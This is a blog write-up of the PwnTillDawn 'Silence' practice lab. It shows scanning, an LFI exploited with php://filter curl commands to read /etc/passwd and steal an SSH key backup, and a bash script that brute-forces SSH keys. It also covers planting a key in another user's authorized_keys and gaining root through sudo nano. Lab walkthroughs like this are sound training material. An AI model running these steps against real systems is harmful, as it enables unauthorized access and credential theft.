---
layout: post
title: PwnTillDawn - Silence Write-Up
date: 2024-12-06
classes: wide
description: Discovery, exploration of LFI and misconfiguration abuse
---

# Silence (10.150.150.55)

![1](/assets/img/post/pwntilldawn_silence/1.png)

## Scanning Phase

Our first step is to identify potential entrypoints, so let's fire up nmap.

```
$ sudo nmap -sV -sC -p- -oN scans/nmap.txt 10.150.150.55
```

![2](/assets/img/post/pwntilldawn_silence/2.png)

Whoa, there's a lot going on, let's carefully analyze the findings:

- A **FTP** server is running on port **21** and it allows anonymous access. It also contains a `test` file.
- **Apache** is also running on por **80** with a default page.
- **SMB** services are available on ports **139** and **445**.
- **SSH** is strangely running on port **1055** instead of the usual default port.

The port being used by SSH tips me that we'll probably use this service later on.   



## FTP Server

This server is a lure, it only allows anonymous access, but doesn't contain any useful information at all. The `test` file is just a simple file with no tips or relevant information inside. You can check it by yourself using `ftp 10.150.150.55` and entering `Anonymous` as both username and password.  



## SMB Server

Unfortunately, this server don't tell us much, by using `crackmapexec` I was able to identify `silence` as an username, but there's nothing more to that. No groups, no additional users, no nothing.  



## FuzzTillDawn

With the other options out of the way, we'll be exploring the webserver using `ffuf` to identify important directories or pages inside the server.

```
$ ffuf -u http://10.150.150.55/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -fc 404,403 -e .php
```

![3](/assets/img/post/pwntilldawn_silence/3.png)

Some interesting pages show up, including a `info.php` and `trick.php` pages. The `browser.php` is a waste of time, since we can't really access it.

![4](/assets/img/post/pwntilldawn_silence/4.png)

The PHP information page gives us the PHP version, root folder and some configurations. Could be interesting, but this is not what we're looking for. On the other hand, the `trick.php` page draws my attention.

The reason this page is so curious is because it doesn't contain anything, and the name suggests it's a trick, so the next step should be fuzzing for parameters.

```
$ sudo ffuf -u http://10.150.150.55/trick.php?FUZZ=1 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

![5](/assets/img/post/pwntilldawn_silence/5.png)

By passing`1` as a value, there are no results at all. This may indicate the parameters are not present or the value might be wrong. Let's do the same while passing a page name.

![6](/assets/img/post/pwntilldawn_silence/6.png)

We've got a match, the `page` parameter tells me this might lead to a LFI, why not try it?

![7](/assets/img/post/pwntilldawn_silence/7.png)

So the LFI vulnerability does exist, since we can only read internal files − This have been verified using a local Python server, which we don't receive any requests − I've decided checking for usernames inside the `/etc/passwd` and found several users:

```
root
gary
john
sally
alice
ftpuser
silence
```

Using PHP filters, we can also read PHP code from the web server with `php://filter`. We can convert the page to Base64, which we can later decode and read, this can be easily done piping `curl` and `base64` in Linux.

```
$ curl http://10.150.150.55/trick.php?page=php://filter/convert.base64-encode/resource=index.php | base64 -d
```

![8](/assets/img/post/pwntilldawn_silence/8.png)

The `index.php` page has been found earlier with `ffuf` and it seems to be a file browser. It expects a `path` variable to navigate through files. 

**URL: http://10.150.150.55/index.php?path=/**

![9](/assets/img/post/pwntilldawn_silence/9.png)

This browser can be used to identify files that can be used to our advantage, let's see what we've got.

![10](/assets/img/post/pwntilldawn_silence/10.png)

The previous users mentioned can also be found here.

![11](/assets/img/post/pwntilldawn_silence/11.png)

One of the users, `sally`, has a backup folder containing SSH information, keys maybe?

![12](/assets/img/post/pwntilldawn_silence/12.png)

Also, one of the flags can be found inside of `john`'s home directory. Unfortunately this browser doesn't allow reading, so we can't access the flag through here.  



## Too Many Keys

Let's use the same PHP filter trick to download the SSH file from sally. 

```
$ curl http://10.150.150.55/trick.php?page=php://filter/convert.base64-encode/resource=../../../home/sally/backup/SSHArchiveBackup.tar.gz | base64 -d | tee SSHArchiveBackup.tar.gz
--- SNIP ---
$ tar -xvf SSHArchiveBackup.tar.gz
```

The contents include a private folder which has **a lot** of keys.

![13](/assets/img/post/pwntilldawn_silence/13.png)

There are a total of one hundred keys inside this directory, so how can we identify which one to use? I'm assuming `sally` is the correct user, since it was inside her backup folder, but which key to use?

To solve this, I've created a bash script to bruteforce the keys and find the correct one. I'm guessing the correct won't ask for a password (hopefully).

```bash
#!/bin/bash

# Usage: ./ssh_key_bruteforce.sh <user> <host> <key_folder>
# Example: ./ssh_key_bruteforce.sh user 192.168.1.100 /path/to/rsa_keys

USER=$1
HOST=$2
KEY_FOLDER=$3

if [[ -z "$USER" || -z "$HOST" || -z "$KEY_FOLDER" ]]; then
    echo "Usage: $0 <user> <host> <key_folder>"
    exit 1
fi

# Iterate over each RSA key in the folder
for KEY in "$KEY_FOLDER"/*; do
    echo "Trying key: $KEY"

    # Attempt to connect using the key
    ssh -i "$KEY" -p 1055 -o BatchMode=yes -o ConnectTimeout=5 "$USER@$HOST" exit 2>/dev/null

    # Check the exit status of the SSH command
    if [[ $? -eq 0 ]]; then
        echo "Success! Key: $KEY"
        exit 0
    fi
done

echo "No valid key found."
exit 1
```

The script asks for a username, host and a key folder. It connects to the server using the keys from the folder and exits soon after. If the connection asks for a password, exiting will result in an error, otherwise, it's the correct key, so it verifies the last command outputted code.

```
$ ./brute.sh sally 10.150.150.55 private
```

![14](/assets/img/post/pwntilldawn_silence/14.png)

After some time running the script against the machine, we've found the correct key file: `id_rsa70`.  



## Silence, Please

Soon after connecting to the server, and knowing the location of the first flag, we have a nice surprise.

![15](/assets/img/post/pwntilldawn_silence/15.png)

The flag is only accessible to the owner of the file, so we can't read it just yet. Time to find a way to access john's account.

![16](/assets/img/post/pwntilldawn_silence/16.png)

While verifying information on Sally, notice that she is member of the `netAdmin` group, and by looking at it's members we can find John as well. Using `find` is a great way to identify files belonging to a certain group.

![17](/assets/img/post/pwntilldawn_silence/17.png)

The `.ssh` folder belongs to the `netAdmin` group, as well as the files inside.

![18](/assets/img/post/pwntilldawn_silence/18.png)

This means we can generate a new SSH key and add it to the `authorized_keys` file to access john's account.

```
$ ssh-keygen -t rsa -b 4096
```

![19](/assets/img/post/pwntilldawn_silence/19.png)

After creating the new key pair, the contents of the `pub` file must be copied to the `authorized_keys` file on the server.

![20](/assets/img/post/pwntilldawn_silence/20.png)

And simple as that we got access to the first flag, one more to go.  



## SUID Privileges

The privilege escalation process is extremely simple. Using `sudo -l` is a common method to identify commands that we can use to escalate privileges. So I've used it soon after getting the first flag.

![21](/assets/img/post/pwntilldawn_silence/21.png)

We can see `nano` is listed as a command that can be executed with `sudo` without need of any password, this couldn't be more easy.

![22](/assets/img/post/pwntilldawn_silence/22.png)

The `nano` command is a known binary that can be used to get privileges when misconfigured in Linux. We'll be applying this technique.

> :bulb: **Note:** [GTFOBins](https://gtfobins.github.io/) is a popular website that has a list of Unix binaries that can be used to bypass restrictions. Whenever listing SUID binaries in a target, remember to verify each binary to check whether is can be used or not.

To exploit this SUID binary, is quite simple: first open nano, press `ctrl + R` followed by `ctrl + X` and type the command `reset;bash 1>&0 2>&0` and press Enter. This should result in a buggy screen, but don't worry, just clear the screen and you're good to go.

![23](/assets/img/post/pwntilldawn_silence/23.png)

Root access granted, just get the final flag inside root home direcotory.